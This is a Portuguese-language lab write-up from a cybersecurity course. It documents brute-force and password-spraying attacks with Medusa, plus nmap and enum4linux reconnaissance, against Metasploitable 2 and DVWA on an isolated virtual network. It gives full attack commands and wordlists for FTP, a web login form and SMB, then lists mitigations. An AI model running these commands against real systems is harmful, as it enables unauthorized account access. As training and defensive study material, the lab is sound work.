# Ataques de Força Bruta com Medusa – Laboratório Prático (Kali Linux, Metasploitable 2 e DVWA)

Este repositório contém a implementação do desafio prático da Pós-Graduação em Cibersegurança da DIO + Santander, utilizando técnicas de força bruta com a ferramenta Medusa em um ambiente totalmente controlado, seguro e isolado.

==================================================
1. Ambiente Utilizado
==================================================

1.1. Máquinas Virtuais
- Kali Linux
- Metasploitable 2
- DVWA – Damn Vulnerable Web Application (integrado ao Metasploitable)

1.2. Hypervisor
Todo o laboratório foi criado e executado utilizando:
- VMware Workstation

==================================================
2. Configuração de Rede
==================================================

As VMs foram configuradas na mesma rede virtual, garantindo comunicação direta e isolamento do ambiente.

Endereçamento utilizado:

Máquina                IP
---------------------  ---------------
Kali Linux             192.168.88.128
Metasploitable 2       192.168.88.129
Host (Windows)         192.168.88.1   (acesso via Termius)

O acesso às VMs foi facilitado utilizando o Termius, permitindo trabalhar diretamente via SSH.

Teste de conectividade (a partir do Kali):

ping 192.168.88.129

==================================================
3. Reconhecimento Inicial (Nmap)
==================================================

O primeiro passo foi identificar serviços vulneráveis expostos pelo Metasploitable:

nmap -sV -p- 192.168.88.129

Principais serviços descobertos:
- FTP (21)
- SSH (22)
- Telnet (23)
- HTTP / DVWA (80)
- SMB (139/445)
- MySQL (3306)

==================================================
4. Wordlists Utilizadas
==================================================

Foram utilizadas wordlists simples para fins didáticos.

wordlists/users.txt
-------------------
admin
user
msfadmin
postgres

wordlists/passwords.txt
-----------------------
123456
password
msfadmin
admin
toor

==================================================
5. Ataque de Força Bruta – FTP
==================================================

O serviço FTP do Metasploitable é propositalmente vulnerável.

Comando utilizado no Kali:

medusa -h 192.168.88.129 -u msfadmin -P wordlists/passwords.txt -M ftp

Resultado esperado:

Usuário: msfadmin
Senha:   msfadmin

Validação do acesso via FTP:

ftp 192.168.88.129

==================================================
6. Ataque ao Formulário de Login – DVWA (HTTP)
==================================================

A DVWA estava acessível via navegador em:

http://192.168.88.129/DVWA/login.php

Configurações utilizadas:
- Security Level: LOW
- Usuário padrão: admin

Comando Medusa para o formulário de login:

medusa -h 192.168.88.129 -u admin -P wordlists/passwords.txt ^
  -M web-form -m FORM:"/DVWA/login.php" ^
  -m FORM-DATA:"username=&password=&Login=Login" ^
  -m DENY-SIGNAL:"Login failed"

(Em Linux, remova os caracteres ^ de quebra de linha e deixe o comando em uma única linha ou use barra invertida.)

Resultado esperado:

Senha encontrada: password

==================================================
7. Password Spraying + Enumeração SMB
==================================================

7.1. Enumeração de usuários

Utilizando o enum4linux para identificar usuários expostos:

enum4linux -U 192.168.88.129

Exemplos de usuários encontrados:
- msfadmin
- user
- postgres

7.2. Password spraying com Medusa

Tentativa de usar a mesma senha para múltiplos usuários:

medusa -h 192.168.88.129 -U wordlists/users.txt -p msfadmin -M smbnt

Resultado esperado:

msfadmin : msfadmin

==================================================
8. Mitigações Recomendadas
==================================================

FTP
---
- Substituir FTP por SFTP.
- Habilitar mecanismos de bloqueio por tentativas (ex.: fail2ban).
- Remover ou restringir logins anônimos.

Aplicações Web (como DVWA)
--------------------------
- Implementar CAPTCHA em formulários de autenticação.
- Aplicar rate limiting por IP.
- Exibir mensagens de erro neutras (sem indicar se o usuário existe).
- Implementar bloqueio progressivo após múltiplas tentativas.

SMB
---
- Adotar políticas de senhas fortes e expiração periódica.
- Desativar SMBv1.
- Habilitar SMB Signing.
- Monitorar e registrar tentativas falhas de autenticação.

==================================================
9. Reflexões e Aprendizados
==================================================

Durante este laboratório, foi possível consolidar:

- Uso prático do Medusa em múltiplos protocolos (FTP, HTTP, SMB).
- Identificação de serviços vulneráveis com Nmap.
- Enumeração de usuários em serviços SMB com enum4linux.
- Entendimento de vulnerabilidades clássicas em FTP, SMB e aplicações web.
- Importância de realizar testes em ambientes isolados para segurança ofensiva.
- Aplicação de técnicas de mitigação e hardening após a identificação das falhas.
- Organização e documentação técnica em um repositório GitHub como portfólio profissional.

==================================================
10. Estrutura Sugerida do Repositório
==================================================

medusa-labs-kali/
├── README.md
├── wordlists/
│   ├── users.txt
│   └── passwords.txt
├── scripts/
│   └── smb_enum.sh
└── images/
    ├── nmap.png
    ├── ftp-medusa.png
    ├── dvwa-medusa.png
    └── smb-medusa.png

==================================================
11. Conclusão
==================================================

Este projeto demonstra:

- Domínio prático de ataques de força bruta em ambiente controlado.
- Capacidade de exploração responsável de serviços vulneráveis.
- Conhecimento de contramedidas para FTP, serviços web e SMB.
- Habilidade de documentar e compartilhar resultados de forma organizada no GitHub.
